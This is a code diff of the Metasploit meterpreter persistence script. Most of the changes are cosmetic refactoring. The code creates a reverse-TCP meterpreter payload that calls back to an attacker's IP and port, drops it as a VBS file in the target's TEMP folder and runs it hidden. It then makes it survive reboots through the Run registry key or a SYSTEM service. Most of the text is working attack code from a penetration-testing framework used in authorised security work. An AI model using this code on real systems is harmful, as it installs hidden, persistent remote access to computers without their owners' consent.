@@ -1,14 +1,12 @@
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
+################## Variable Declarations ##################
+
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
-
-# Author: Carlos Perez at carlos_perez[at]darkoperator.com
-#-------------------------------------------------------------------------------
-################## Variable Declarations ##################
 
 # Meterpreter Session
 @client = client
@@ -32,13 +30,13 @@ script_on_target = nil
 @exec_opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "This help menu"],
   "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
-  "-p"  => [ true,   "The port on the remote host where Metasploit is listening"],
+  "-p"  => [ true,   "The port on which the system running Metasploit is listening"],
   "-i"  => [ true,   "The interval in seconds between each connection attempt"],
   "-X"  => [ false,  "Automatically start the agent when the system boots"],
   "-U"  => [ false,  "Automatically start the agent when the User logs on"],
   "-S"  => [ false,  "Automatically start the agent on boot as a service (with SYSTEM privileges)"],
   "-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"],
-  "-L"  => [ true,   "Location in target host where to write payload to, if none \%TEMP\% will be used."],
+  "-L"  => [ true,   "Location in target host to write payload to, if none \%TEMP\% will be used."],
   "-T"  => [ true,   "Alternate executable template to use"],
   "-P"  => [ true,   "Payload to use, default is windows/meterpreter/reverse_tcp."]
 )
@@ -76,9 +74,11 @@ end
 #-------------------------------------------------------------------------------
 def create_script(delay,altexe,raw)
   if altexe
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay, :template => altexe})
+    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                          {:persist => true, :delay => delay, :template => altexe})
   else
-    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw, {:persist => true, :delay => delay})
+    vbs = ::Msf::Util::EXE.to_win32pe_vbs(@client.framework, raw,
+                                          {:persist => true, :delay => delay})
   end
   print_status("Persistent agent script is #{vbs.length} bytes long")
   return vbs
@@ -95,9 +95,11 @@ def log_file(log_path = nil)
 
   # Create a directory for the logs
   if log_path
-    logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+    logs = ::File.join(log_path, 'logs', 'persistence',
+                       Rex::FileUtils.clean_path(host + filenameinfo) )
   else
-    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+    logs = ::File.join(Msf::Config.log_directory, 'persistence',
+                       Rex::FileUtils.clean_path(host + filenameinfo) )
   end
 
   # Create the log directory
@@ -114,13 +116,14 @@ def write_script_to_target(target_dir,vbs)
   if target_dir
     tempdir = target_dir
   else
-    tempdir = @client.sys.config.getenv('TEMP')
+    tempdir = @client.fs.file.expand_path("%TEMP%")
   end
   tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
   fd = @client.fs.file.new(tempvbs, "wb")
   fd.write(vbs)
   fd.close
   print_good("Persistent Script written to #{tempvbs}")
+  tempvbs = tempvbs.gsub(/\\/, '//')      # Escape windows pathname separators.
   file_local_write(@clean_up_rc, "rm #{tempvbs}\n")
   return tempvbs
 end
@@ -150,23 +153,24 @@ def targets_exec(script_on_target)
   print_status("Executing script #{script_on_target}")
   proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
   print_good("Agent executed with PID #{proc.pid}")
-  file_local_write(@clean_up_rc, "kill #{proc.pid}\n")
   return proc.pid
 end
 
-# Function to insytall payload in to the registry HKLM or HKCU
+# Function to install payload in to the registry HKLM or HKCU
 #-------------------------------------------------------------------------------
 def write_to_reg(key,script_on_target)
   nam = Rex::Text.rand_text_alpha(rand(8)+8)
-  print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-  if(key)
-    registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
-    print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-    file_local_write(@clean_up_rc, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
+  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  print_status("Installing into autorun as #{key_path}\\#{nam}")
+  if key
+    registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
+    print_good("Installed into autorun as #{key_path}\\#{nam}")
+    file_local_write(@clean_up_rc, "reg deleteval -k '#{key_path}' -v #{nam}\n")
   else
     print_error("Error: failed to open the registry key for writing")
   end
 end
+
 # Function to install payload as a service
 #-------------------------------------------------------------------------------
 def install_as_service(script_on_target)
@@ -219,13 +223,13 @@ print_status("Running Persistance Script")
 @clean_up_rc = log_file()
 print_status("Resource file for cleanup created at #{@clean_up_rc}")
 # Create and Upload Payload
-raw = create_payload(payload_type,rhost,rport)
-script = create_script(delay,altexe,raw)
-script_on_target = write_script_to_target(target_dir,script)
+raw = create_payload(payload_type, rhost, rport)
+script = create_script(delay, altexe, raw)
+script_on_target = write_script_to_target(target_dir, script)
 
 # Start Multi/Handler
 if autoconn
-  set_handler(payload_type,rhost,rport)
+  set_handler(payload_type, rhost, rport)
 end
 
 # Execute on target host
